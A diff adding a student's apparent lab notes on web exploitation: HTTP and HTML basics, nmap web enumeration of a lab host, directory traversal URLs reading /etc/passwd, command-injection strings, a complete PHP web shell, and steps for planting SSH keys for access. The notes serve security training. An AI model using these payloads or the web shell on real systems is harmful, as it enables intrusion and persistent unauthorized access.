@@ -30,8 +30,6 @@ authors = tree.xpath('//small[@class="author"]/text()')
 print ('Authors: ',authors)
 ######## web.py ########
 
-
-
 #quotes to scrape
 #w3schools.com/html/
 #understanding html tags
@@ -87,6 +85,249 @@ nmap -Pn -T5 --script discovery 192.168.65.20 -p 21-23,80
 nmap -Pn -T5 --script "discovery or safe" 192.168.65.20 -p 21-23,80
 
 nmap -Pn -T5 --script ftp* 192.168.65.20 -p 21-23,80
+
+======================================================================================================================
+
+#Day 2 -- Web Explotation (Enum/Exploit)
+
+#HTTP request message - request line 
+GET / HTTP/1.1
+Get = requesting/retrieing
+Post = Sending information
+(Get <==, Post<==, Put, Head)
+
+/ = top level domain
+  www.google.com/
+  www.google.com/maps
+  (/maps)
+
+HTTP/1.1 = version
+
+#HTTP respnse message - status line
+HTTP/1.1 200 OK
+
+HTTP/1.1 = version
+200 = 2|00
+2 = successful
+00 = OK
+                                              
+404 = 4|04
+4 = client error
+04 = not found
+
+#list of status codes
+https://en.wikipedia.org/wiki/List_of_HTTP_status_codes
+
+ok = message
+
+
+
+#Demo - Dev console
+Console Tab
+
+Code:
+function stuff() {
+<code stuff here>
+}
+
+stuff ();
+
+
+#HTML
+-HTML = Frame of the webpage / house
+-CSS = Drywall/Paint/Templates
+-Javascript = Scripts/Functions/Interaction
+
+#image
+<img src="shutterstock_246695119_1080.jpg" height="500" width="500"> <br>
+
+#comment
+<! Notice anything wrong with the button?  Oh and this is a comment>
+
+javascript = <script></script>
+
+<script>
+function myFunction(){
+document.getElementById("demo").innerHTML = "Paragraph changed.";} </script>
+||
+\/
+<script> </script> = Javascript
+function myFunction() = Defining function, name of function is myFunction
+document = Specifies the HTML document
+getElementById("demo") = element name id with value of demo
+innerHTML = The string between the html tags
+
+
+
+<script>
+function changeText() {
+  x = document.getElementById("mySelect");
+  x.options[x.selectedIndex].text = "Melon";
+}
+</script>
+
+<script></scipt> = javascript HTML tags
+function changeText() = function names changeText()
+x= vaiable
+document = html document
+getElementById = Id="mySelect"
+x.options = 
+  <option>Apple</option>
+  <option>Orange</option>
+  <option>Pineapple</option>
+  <option>Banana</option>
+selectedIndex = Select Item
+
+
+
+#Web enumeration
+1.scanning
+cd /usr/share/nmap/scripts/
+ls | grep http
+
+http-enum.nse
+http-robots.txt.nse
+
+nmap -Pn -T5 --script=http-enum.nse 10.50.41.203 -p 80
+results:
+PORT   STATE SERVICE
+80/tcp open  http
+| http-enum: 
+|   /robots.txt: Robots file
+|   /java/: Potentially interesting directory w/ listing on 'apache/2.4.29 (ubuntu)'
+|   /path/: Potentially interesting directory w/ listing on 'apache/2.4.29 (ubuntu)'
+|_  /uploads/: Potentially interesting directory w/ listing on 'apache/2.4.29 (ubuntu)'
+
+nmap -Pn -T5 --script=http-robots.txt.nse 10.50.41.203 -p 80
+results:
+PORT   STATE SERVICE
+80/tcp open  http
+| http-robots.txt: 2 disallowed entries 
+|_/cross /
+
+/robots.txt  <== legit
+/java/  <== legit
+/path/  <== legit
+/uploads/  <== legit
+/cross /  <== legit
+
+2.robots.txt
+http://10.50.41.203/robots.txt
+
+User-agent: *
+Allow: /uploads
+Allow: /chat
+Allow: /cmdinjection
+Allow: /java
+Allow: /path
+Allow: /webexample
+Disallow: /cross
+Disallow: /
+
+
+3.legitmite surfing
+going to each user agent
+and seeing if its legit
+
+
+
+#Web Exploitation
+1. Directory Traversal - Info
+../../../../../../../../../../../../../../etc/passwd
+
+/etc/passwd
+/etc/group
+/etc/hosts
+/etc/networks
+/etc/resolv.conf
+/etc/os-release
+
+http://10.50.41.203/path/pathdemo.php?myfile=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&submit=File+look+up
+myfile <== parameter
+submit <== parameter
+    file look up
+
+http://10.50.41.203/path/pathdemo.php
+http://10.50.41.203/path/pathdemo.php?
+? = Query String Parameters
+http://10.50.41.203/path/pathdemo.php?=
+http://10.50.41.203/path/pathdemo.php?=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
+
+
+2. Command injection - Info/Access
+../../../../../../../../../../../../../../etc/passwd
+; id
+; whoami
+
+
+3. Web SHell - Info/Access
+1. Can you upload? Yes 
+2. Is your uploads being sanitized? No
+3. Can you access the uploads directory? Yes
+
+##### webshell.php ####
+<HTML><BODY>
+<Form METHOD="GET" NAME="badform" ACTION="">
+<INPUT TYPE="text" NAME="cmd">
+<INPUT TYPE="submit" VALUE="hello">
+</Form>
+<?php system($_GET['cmd']);?>
+</BODY></HTML>
+##### webshell.php ####
+
+10.50.41.203/
+
+id
+
+2a (CmdInj)/3a (WebShell). SSh keys - Access
+
+1. Determine who the user is
+id
+who
+
+www-data
+
+2. Determine user's home directory
+cat /etc/passwd
+
+www-data:x:33:33:www-data:/var/www:/bin/bash
+
+www-data = user
+/var/www = www-data's home directory
+/bin/bash = login shell
+
+3. Generate SSH keys from the workstation you will login from
+ssh-keygen -t rsa -b 4096
+[Enter]
+[Y] to Overwrite
+[Enter]
+
+cd /home/student/.ssh
+ls
+id_rsa = private
+id_rsa.pub = public   <=== key to be uploaded on target
+
+cat id_rsa.pub
+ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQCzc7fGxYzYunC/P7RHhDqSNPC9M8pAk2S8qXQV/LTVvfmapeFrvKpFOWUdgM2ekNbVNESZgFhzg4SFd1IhZuQIj+JrxBDUpu+cz3rr52FV0IWnPQr9hc/c6SIigWYhLVsDvR1i9sPSl+/SaG5FPxnZ+pBpKzaFfsydIWbDUImWe23AgAviRJ8G2IMgFjQxEenJqyNcmO/nKUWlUZN1rX2fzgwM7mTmV8rUs0f+jxKoFi9wTzX0apYhGD7qRTJ9qyDYU5HfuHSi0hcBi5eCDgwFwjgBBG9Gmc8CaoPGeWleV9PkbcuyhxDeNd42l7RLarPI0e5o4xZ3dmu3qq9w621QQd08ys6dltWQspPTy65LRPq8srCrFFHg+RU6tgSYkJRnB12Urf4YtYB0nmDYXDgCpoFpa90sbnWSUl8uPeH1aic1SbGGhFyjDTEtZsrdxHjPRFXn8tOXOrXewCrBGYAQiCKA6kZ9nCTZCpvnHIHOUx9zqzqzScK8MiwSkxvCX4lKXvzZxwjzQSDpEvcEqgZtkgPTve8llkqrYLCZJVux1GaQDgwBngplEuqON6Sq+xDE1xE4KyefCG5OwIZo/oWsrl2E1KFNqaqu+AoiiLhaQJWeVzrDevK9pAJv6ZROo/EQ38KJeHaLOtqDlJyZYWW+gTzrJnjmr7uFeAKDImYk7w== student@lin-ops
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 
